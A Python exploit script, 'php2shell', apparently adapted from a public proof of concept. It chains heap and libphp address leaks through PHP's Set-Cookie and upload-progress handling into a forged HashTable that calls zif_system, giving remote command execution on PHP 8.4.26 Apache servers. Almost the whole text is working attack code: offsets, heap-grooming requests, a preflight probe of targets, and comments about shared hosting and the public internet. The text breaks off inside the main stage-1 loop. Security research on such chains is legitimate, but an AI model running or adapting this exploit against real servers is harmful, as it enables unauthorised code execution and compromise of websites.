#!/usr/bin/env python3
"""
php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork.

Default profile: official php:8.4.26-apache image (Apache 2.4.69).
Lab build (Apache 2.4.68, minimal PHP): use --profile lab.

Chain (all attacker traffic is plain HTTP):
  stage 0  HTTP worker rotation
  stage 1  Set-Cookie heap leak        -> Zend MM chunk base
  stage 2  Set-Cookie libphp leak      -> libphp base (ZVAL_PTR_DTOR)
  stage 3  upload_progress fake-ref    -> pDestructor = zif_system

Requirements on the target (the shipped docker/ setup matches these settings):
  display_errors=1, memory_limit=8M, max_input_vars=1000,
  session.use_cookies=1, session.use_strict_mode=0,
  session.upload_progress.enabled=1, single-worker prefork.

Usage:
  python3 exploit.py -u http://127.0.0.1:8088/index.php
  python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' --proof-file out/p1
  python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'id>/tmp/p1' --proof-file /tmp/p1

The command is embedded in a 167-byte live zend_string; the maximum command
length for this payload layout is 14 bytes.  For a longer command, chain it
through a short shell trigger, e.g. `sh</out/c` (8 bytes).

NOTE (lab adaptation): --cmd and --proof-file must point at the SAME path --
proof is just the local file this script polls.  The original public PoC
defaults to `id>/out/p1` while looking at `out/p1`, which silently produces
false negatives if you change only one of them.

Provenance: exploit chain from the public research PoC
https://github.com/9bie/php2shell-bypass-aslr-exp (heap-leak + fake-reference
chain).  Changes made here for this lab: relaxed the user-space pointer range
filter (0x7f.. -> 0x60.., needed because this host maps the heap at 0x716b..
/ 0x7c37..), lab setup scripts, differential and offset-sweep tooling.
"""

from __future__ import annotations

import argparse
import os
import re
import socket
import ssl
import struct
import subprocess
import threading
import sys
import time
import urllib.parse
from collections import Counter

# Offsets for the lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).
# They are relative to the libphp.so / Zend MM chunk base, so they do not
# depend on ASLR.  Rebuilds can shift them; pass --zif-offset/--dtor-offset.
ZIF_OFFSET = 0x43A870       # zif_system
DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8     # live 167-byte string used as fake HashTable
MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL

# bookworm (official php:8.4.26-apache) calibration, measured on the image
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

SID = b"attacksessionid0001"
DEFAULT_CMD = "id>/out/p"
_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PROOF = os.path.join(_HERE, "out", "p")
DEFAULT_OFFSETS = os.path.join(_HERE, "out", "offsets.env")


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def read_offsets_file(path: str) -> dict[str, int]:
    """Read ZIF_OFFSET=0x.. / DTOR_OFFSET=0x.. written by docker/offsets.py."""
    vals: dict[str, int] = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals


class Target:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.url_base = f"{u.scheme}://{u.netloc}{self.path}"
        self.timeout = timeout
        self.verbose = verbose
        self.keepalive = True          # 单连接复用 = 钉住同一个 prefork child
        self._sock = None

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    # 目标是 IP 直连（证书 CN 不匹配）→ 必须不校验，否则 TLS 直接挂
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def _post_close(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        # Read concurrently with the upload: some exploit requests make the
        # worker abort right after sending Set-Cookie, and a recv() that starts
        # after the RST loses the already-buffered response.
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # the worker may abort while the body is still in flight
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def _get_close(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


    # ---------- keep-alive 通道：一条连接钉住一个 prefork child ----------
    # 共享托管都是多 worker：旧实现每个请求 Connection: close，泄露/伪造/触发
    # 极易落到不同 child，堆布局与 PS(http_session_vars) 就不在同一进程里。
    def _close_sock(self) -> None:
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None

    def _read_resp(self, s, read_cap: int) -> tuple[bytes, bool]:
        """读一个完整响应（按 Content-Length / chunked 分帧），返回 (原始字节, 服务端是否要求关闭)。"""
        buf = bytearray()
        try:
            while b"\r\n\r\n" not in buf and len(buf) < read_cap:
                chunk = s.recv(65536)
                if not chunk:
                    return bytes(buf), True
                buf += chunk
        except OSError:
            return bytes(buf), True
        head, _, rest = bytes(buf).partition(b"\r\n\r\n")
        hdrs: dict[bytes, bytes] = {}
        for ln in head.split(b"\r\n")[1:]:
            if b":" in ln:
                k, v = ln.split(b":", 1)
                hdrs[k.strip().lower()] = v.strip()
        closed = hdrs.get(b"connection", b"").lower().startswith(b"close")
        body = bytearray(rest)
        try:
            if b"chunked" in hdrs.get(b"transfer-encoding", b"").lower():
                while b"0\r\n\r\n" not in body and len(body) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    body += c
            else:
                need = int(hdrs.get(b"content-length", b"0") or 0)
                while len(body) < need and len(body) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    body += c
        except (OSError, ValueError):
            pass
        return head + b"\r\n\r\n" + bytes(body), closed

    def _exchange(self, method: str, path: str, body: bytes | None,
                  ctype: str | None, read_cap: int, timeout: float | None,
                  extra_headers: dict[str, str] | None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        ct = f"Content-Type: {ctype}\r\n" if ctype else ""
        cl = f"Content-Length: {len(body)}\r\n" if body is not None else ""
        hdr = (f"{method} {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n{extra}{ct}{cl}"
               f"Connection: keep-alive\r\n\r\n").encode()
        for attempt in (1, 2):
            fresh = self._sock is None
            s = self._connect() if fresh else self._sock
            self._sock = s
            try:
                s.settimeout(timeout or self.timeout)
                s.sendall(hdr)
                if body:
                    mv = memoryview(body)
                    for off in range(0, len(body), 262144):
                        s.sendall(mv[off:off + 262144])
                resp, closed = self._read_resp(s, read_cap)
                if closed or not resp:
                    self._close_sock()          # child 死了/服务端要关：下个请求重连
                return resp
            except OSError:
                self._close_sock()
                if attempt == 2:
                    return b""
                time.sleep(0.15)
        return b""

    def post_raw(self, body: bytes, ctype: str, read_cap: int = 65536,
                 timeout: float | None = None) -> bytes:
        """任意 Content-Type 的 POST（前提门用：缺 boundary 的 multipart）。"""
        if not self.keepalive:
            s = self._connect()
            hdr = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                   f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n"
                   "Connection: close\r\n\r\n").encode()
            try:
                s.settimeout(timeout or self.timeout)
                s.sendall(hdr + body)
                out = bytearray()
                while len(out) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    out += c
                return bytes(out)
            except OSError:
                return b""
            finally:
                s.close()
        return self._exchange("POST", self.path, body, ctype, read_cap, timeout, None)

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        if not self.keepalive:
            return self._post_close(body, boundary, read_cap, timeout, extra_headers)
        return self._exchange("POST", self.path, body,
                              f"multipart/form-data; boundary={boundary.decode()}",
                              read_cap, timeout, extra_headers)

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        if not self.keepalive:
            return self._get_close(path, read_cap)
        resp = self._exchange("GET", path, None, None, read_cap, None, None)
        head, _, b = resp.partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), b


def preflight(t: Target, quiet: bool = False) -> dict:
    """链的硬前提体检（不碰被渗透应用，只用 PHP 启动期行为）。

    display_errors=On 是 stage1 的前提：伪造的 zend_string 之所以能进 Set-Cookie，
    靠的是启动期 Warning 被输出、headers_sent 置 1 后 session cookie 走另一条路径。
    display_errors=Off 时 Warning 只进日志，headers_sent 保持 0 → 泄漏不会发生。
    """
    out: dict = {"display_errors": False, "php_version": None, "server": "",
                 "memory_limit": None, "post_cap_mb": None}
    # 1) 版本/服务头
    try:
        st, body = t.get(t.path, read_cap=8192)
    except OSError:
        st, body = 0, b""
    # 2) 缺 boundary 的 multipart → PHP 启动期 "Missing boundary ... in Unknown on line 0"
    resp = t.post_raw(b"--\r\n\r\n--\r\n", "multipart/form-data", read_cap=16384)
    # 3) >1000 字段 → "Input variables exceeded 1000"（同时证明 body 真被解析）
    parts = bytearray()
    for i in range(1100):
        parts += b"--gf\r\n" + b'Content-Disposition: form-data; name="v%d"\r\n\r\nx\r\n' % i
    parts += b"--gf--\r\n"
    resp2 = t.post_raw(bytes(parts), "multipart/form-data; boundary=gf", read_cap=16384)
    probe = resp + resp2
    out["display_errors"] = (b"Missing boundary" in probe or b"Input variables exceeded" in probe
                             or re.search(rb"<b>(Warning|Fatal error|Notice)</b>:", probe) is not None)
    if not out["display_errors"]:
        try:
            import urllib.request
            req = urllib.request.Request(t.url_base, method="GET",
                                         headers={"User-Agent": "Mozilla/5.0 (compatible; php2shell/2.0)"})
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            r = urllib.request.urlopen(req, timeout=10, context=ctx)
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            out["server"] = hdrs.get("server", "")[:40]
            m = re.search(r"PHP/(\d+\.\d+\.\d+)", hdrs.get("x-powered-by", ""), re.I)
            out["php_version"] = m.group(1) if m else None
        except Exception:
            pass
    if out["display_errors"]:
        for mb in (8, 34, 70, 140):
            body_big = (b"--gm\r\n" + b'Content-Disposition: form-data; name="big"\r\n\r\n'
                        + b"B" * (mb * 1024 * 1024) + b"\r\n--gm--\r\n")
            r = t.post_raw(body_big, "multipart/form-data; boundary=gm", read_cap=4096, timeout=40)
            m = re.search(rb"Allowed memory size of (\d+) bytes", r)
            if m:
                out["memory_limit"] = int(m.group(1)); break
            if re.match(rb"HTTP/1\.[01] (400|413)", r):
                out["post_cap_mb"] = mb; break
    if not quiet:
        print(f"[*] gate: display_errors={out['display_errors']} php={out['php_version']} "
              f"memory_limit={out['memory_limit']} post_cap={out['post_cap_mb']}MB", flush=True)
    return out


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: 2MB-aligned mode of the heap pointers in the decoded cookie."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x600000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    """Stage 2: Set-Cookie data starts at PS(id)+0x18 = nNextFreeElement|pDestructor.

    The page-aligned check is 4KB, not 2MB: the lab build happened to map
    libphp at a 2MB boundary, but the official php:8.4.26-apache image maps it
    at a 4KB boundary (e.g. base 0x...acdb000).
    """
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x600000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Exploit:
    def __init__(self, target: Target, cmd: str, zif_offset: int = ZIF_OFFSET,
                 dtor_offset: int = DTOR_OFFSET, htdata_offset: int = HTDATA_OFFSET,
                 huge_mb: int = 12, verbose: bool = True, profile: str = "lab"):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.profile = profile
        if profile == "bookworm":
            # official php:8.4.26-apache (Debian 12, Apache 2.4.69)
            self.stage1_n = BOOKWORM_STAGE1_N
            self.stage2_t = BOOKWORM_STAGE2_T
            self.stage2_v = BOOKWORM_STAGE2_V
            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
            self.stage3_carrier = True
        else:
            self.stage1_n = 892
            self.stage2_t = 443
            self.stage2_v = 1
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False

    # ---------- request primitives (shapes match tools/*.py) ----------

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        """Abort the current worker over HTTP; prefork forks a fresh one."""
        self.t.log("[*] rotating worker over HTTP")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        # Session-initializing B with no file part: pre-RINIT cleanup walks the
        # corrupted heap and the child aborts.
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        # slow hosts need the forked child to be ready before the next request
        time.sleep(1.2)

    def stage1(self) -> int:
        """Leak the Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.6)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string len
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        """Leak libphp base through a 56-byte HashTable page."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.6)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"command is {len(cmd)} bytes; the 167-byte carrier allows at most "
                f"{MAX_CMD} (e.g. use 'sh</out/c')"
            )
        ht = bytearray(b"\x00" * 167)
        # fake HashTable
        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
        # fake execute_data at E = data+0x20
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
        # fake zend_string at data+0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                     # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        # fake reference (55 bytes) placed at R0-0x10
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Write the fake reference over PS(http_session_vars) and execute."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        specs = self.stage3_pads
        for i, (nl, vl) in enumerate(specs):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            # Keep PS(id) valid: php_session_initialize then leaves
            # send_cookie=0, so B's init does not allocate the Set-Cookie
            # header at R0+16 (which would clobber val.type).
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # The bookworm reference is still alive (rc=2).  A 15-byte
            # bin-40 zend_string lands its chars exactly at
            # PS(http_session_vars): keep gc (rc=1, IS_REFERENCE), rewrite the
            # low 7 bytes of val.value to the fake HashTable, and let the
            # high byte stay 0x00 (canonical 0x00007f... pointer).
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell one-click exploit (official php:8.4.26-apache / lab)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", required=True,
                    help="target PHP page, e.g. http://127.0.0.1:8088/index.php")
    ap.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                    help=f"command to execute (max {MAX_CMD} bytes)")
    ap.add_argument("--proof-file", default=DEFAULT_PROOF,
                    help="read this local file after exploitation; '' disables")
    ap.add_argument("--fetch", default="",
                    help="GET this path afterwards (for commands writing to webroot)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of zif_system in libphp.so (default: offsets file or 0x{ZIF_OFFSET:x})")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of ZVAL_PTR_DTOR in libphp.so (default: offsets file or 0x{DTOR_OFFSET:x})")
    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm",
                    help="target build profile: bookworm (official image, default) or lab (Apache 2.4.68)")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
                    help="chunk-relative offset of the 167-byte live string")
    ap.add_argument("--offsets-file", default=DEFAULT_OFFSETS,
                    help="read libphp offsets from this file ('' to disable)")
    ap.add_argument("--docker-container", default="php2shell-target",
                    help="container used to auto-derive offsets on localhost")
    ap.add_argument("--no-auto-offsets", action="store_true",
                    help="never run docker/offsets.py automatically")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="size of the OOM field; must exceed memory_limit")
    ap.add_argument("--timeout", type=float, default=30.0, help="per-request timeout")
    ap.add_argument("--no-pre-rotate", action="store_true",
                    help="skip the initial worker rotation")
    ap.add_argument("--no-retry-rotate", action="store_true",
                    help="do not rotate between failed stage attempts")
    ap.add_argument("--retries", type=int, default=3,
                    help="attempts per leak stage; stage 3 uses retries+2")
    ap.add_argument("-q", "--quiet", action="store_true")
    ap.add_argument("--no-keepalive", action="store_true",
                    help="每个请求新建连接（旧行为；多 worker 主机上会失配）")
    ap.add_argument("--no-gate", action="store_true",
                    help="跳过前提门体检（display_errors / memory_limit）")
    ap.add_argument("--force", action="store_true",
                    help="前提门不通过仍继续（不推荐；多数情况会白打）")
    ap.add_argument("--libphp", default="",
                    help="本地 libphp.so 路径，直接算 offsets（免 docker）")
    ap.add_argument("--allow-unsupported", action="store_true",
                    help="PHP < 8.0 也继续（zend 结构与本链不匹配，仅供研究）")
    args = ap.parse_args()

    if len(args.cmd.encode()) > MAX_CMD:
        ap.error(f"--cmd is limited to {MAX_CMD} bytes by the 167-byte carrier")
    if args.proof_file and os.path.basename(args.proof_file) not in args.cmd:
        print("[!] warning: --proof-file and --cmd look unrelated; proof polling "
              "usually needs the command to write that exact path", flush=True)

    if args.htdata_offset is None:
        args.htdata_offset = (BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm"
                              else HTDATA_OFFSET)

    local_offsets = read_offsets_file(args.offsets_file)
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet)
    t.keepalive = not args.no_keepalive

    # 本地 libphp.so 直接算偏移（免 docker）：适合拿到目标同款构建的包后算
    if args.libphp:
        helper = os.path.join(_HERE, "offsets.py")
        if not os.path.exists(helper):
            raise SystemExit(f"offsets.py not found next to poc.py ({helper})")
        subprocess.run([sys.executable, helper, args.libphp,
                        args.offsets_file or DEFAULT_OFFSETS], check=False, timeout=120)
        local_offsets = read_offsets_file(args.offsets_file or DEFAULT_OFFSETS)

    # 前提门：链在公网上成不成立，先问一句再动手
    if not args.no_gate:
        pf = preflight(t, quiet=args.quiet)
        ver = pf.get("php_version")
        if ver and tuple(int(x) for x in ver.split(".")) < (8, 0) and not args.allow_unsupported:
            print(f"UNSUPPORTED_VERSION {ver}: 本链的 zend_string / zend_reference / "
                  f"zend_execute_data / HashTable 布局是 PHP 8.x 的；5.x/7.x 偏移与结构都不同，"
                  f"不是改参数能通的事。要打 7.x 得单独移植（--allow-unsupported 仅供研究）。",
                  file=sys.stderr)
            return 1
        if not pf.get("display_errors") and not args.force:
            print("GATE_FAILED (display_errors=Off): stage1 的 Set-Cookie 堆泄漏依赖启动期 "
                  "Warning 被输出、headers_sent 置 1；该主机把错误只写日志，泄漏不会发生。"
                  "换目标或 --force 硬试（成功率极低）。", file=sys.stderr)
            return 1
        if pf.get("memory_limit"):
            ml_mb = pf["memory_limit"] // (1024 * 1024)
            if args.huge_mb <= ml_mb:
                args.huge_mb = ml_mb + 4
                t.log(f"[*] memory_limit={ml_mb}MB -> huge field {args.huge_mb}MB")
        if pf.get("post_cap_mb") and pf.get("memory_limit") is None:
            t.log(f"[!] post cap ~{pf['post_cap_mb']}MB but memory_limit unknown: "
                  f"OOM 可能够不到（body 上限低于内存上限时不可利用）")

    # A local docker target may be built from a different image/toolchain than
    # the lab; ask the container for its real libphp offsets once.
    if (not local_offsets and not args.no_auto_offsets and args.offsets_file
            and t.host in ("127.0.0.1", "localhost", "::1")):
        helper = os.path.join(_HERE, "docker", "offsets.py")
        if os.path.exists(helper):
            if not args.quiet:
                print("[*] no offsets file; reading libphp symbols from "
                      f"container {args.docker_container}", flush=True)
            try:
                subprocess.run(
                    [sys.executable, helper, args.docker_container, args.offsets_file],
                    check=False, timeout=60,
                    stdout=None if not args.quiet else subprocess.DEVNULL,
                    stderr=None if not args.quiet else subprocess.DEVNULL,
                )
            except (OSError, subprocess.SubprocessError):
                pass
            local_offsets = read_offsets_file(args.offsets_file)

    if args.zif_offset is None:
        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET)
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET)

    ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
                 dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
                 huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile)
    t.log(f"[*] target {args.url} (cmd={args.cmd!r})")
    if local_offsets:
        t.log(f"[*] offsets loaded from {args.offsets_file}")
    t.log(f"[*] offsets: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
          f"htdata=0x{args.htdata_offset:x}")

    def rotate_after_failure() -> None:
        if not args.no_retry_rotate:
            ex.rotate()
            time.sleep(1.0)

    if not args.no_pre_rotate:
        ex.rotate()
        time.sleep(1.0)

    # ---- stage 1 ----
    chunk = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 1: heap leak (attempt {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
